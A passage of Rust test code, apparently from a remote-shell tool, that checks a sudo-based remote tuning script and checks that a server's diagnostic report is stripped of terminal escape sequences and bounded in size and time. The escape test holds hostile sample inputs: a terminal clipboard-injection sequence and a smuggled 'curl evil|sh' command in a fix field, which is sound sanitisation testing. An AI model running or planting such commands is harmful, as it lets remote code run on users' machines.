    let dir = std::env::temp_dir().join(format!("qsh-tune-remote-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let (bin, home) = (dir.join("bin"), dir.join("home"));
    std::fs::create_dir_all(home.join(".local/bin")).unwrap();
    std::fs::create_dir_all(&bin).unwrap();
    let script = |path: &std::path::Path, text: &str| {
        std::fs::write(path, text).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    };
    script(&bin.join("sudo"), "#!/bin/sh\necho \"sudo $*\"\n");
    let run = |path: &str| {
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(super::client::TUNE_REMOTE)
            .env_clear()
            .env("PATH", path)
            .env("HOME", &home)
            .output()
            .unwrap();
        (
            out.status.code(),
            String::from_utf8_lossy(&out.stdout).into_owned(),
            String::from_utf8_lossy(&out.stderr).into_owned(),
        )
    };
    let path = format!("{}:/usr/bin:/bin", bin.display());
    // None at all
    assert_eq!(run(&path).0, Some(42));
    // The user's own copy: refused, with the way out
    if qsh_core::sys::euid() != 0 {
        script(&home.join(".local/bin/qsh-server"), "#!/bin/sh\necho mine\n");
        let (code, out, err) = run(&path);
        assert_eq!(code, Some(43), "{out} {err}");
        assert!(!out.contains("sudo"), "{out}");
        assert!(err.contains("install qsh-server for the whole system"), "{err}");
        std::fs::remove_file(home.join(".local/bin/qsh-server")).unwrap();
    }
    // A root-owned program in root's directories (here env(1), through a link on PATH): run
    // by its real path
    let env = ["/usr/bin/env", "/bin/env"]
        .into_iter()
        .find(|p| std::path::Path::new(p).exists())
        .unwrap();
    let real = std::fs::canonicalize(env).unwrap();
    std::os::unix::fs::symlink(&real, bin.join("qsh-server")).unwrap();
    let (code, out, err) = run(&path);
    assert_eq!(code, Some(0), "{out} {err}");
    assert_eq!(out.trim(), format!("sudo -- {} tune --apply", real.display()));
    let _ = std::fs::remove_dir_all(dir);
}

/// Review L3 (doctor): the remote report is the server's; every string of it reaches the
/// terminal as text only, and ssh's output is read within a size and a time limit.
#[test]
fn the_remote_report_is_text_only_and_bounded() {
    let line = json!({
        "doctor": 1,
        "host": {"name": "web\u{1b}]0;owned\u{7}1", "os_name": "Linux\u{1b}[8m hidden"},
        "checks": [{"id": "firewall", "status": "fail",
                    "summary": "blocked\u{1b}]52;c;Y3VybCB4fHNo\u{7}",
                    "fix": {"root": true, "commands": ["sudo ufw allow 60443\u{1b}[8m; curl evil|sh"]}}]
    })
    .to_string();
    let Remote::Report(r) = parse_remote(Some(0), &format!("motd\n{line}\n"), "") else {
        panic!("a report")
    };
    let text = r.to_string();
    assert!(!text.contains('\u{1b}') && !text.contains('\u{7}'), "{text}");
    assert_eq!(r["host"]["name"], "web1");
    assert_eq!(
        r["checks"][0]["fix"]["commands"][0],
        "sudo ufw allow 60443; curl evil|sh"
    );
    let Remote::Error(e) = parse_remote(Some(255), "", "\u{1b}[2Jno route") else {
        panic!("an error")
    };
    assert_eq!(e, "ssh failed: no route");

    let mut big = std::process::Command::new("sh");
    big.args(["-c", "head -c 3000000 /dev/zero | tr '\\0' x; echo done >&2"]);
    let out = super::system::run_capped(big, std::time::Duration::from_secs(20), 1 << 20, 1024).unwrap();
    assert_eq!(
        (out.status, out.stdout.len(), out.stderr.as_str()),
        (0, 1 << 20, "done\n")
    );
    let mut slow = std::process::Command::new("sleep");
    slow.arg("30");
    let started = std::time::Instant::now();
    let out = super::system::run_capped(slow, std::time::Duration::from_millis(200), 1024, 1024).unwrap();
    assert_eq!(out.status, -1);
    assert!(started.elapsed() < std::time::Duration::from_secs(10));
}
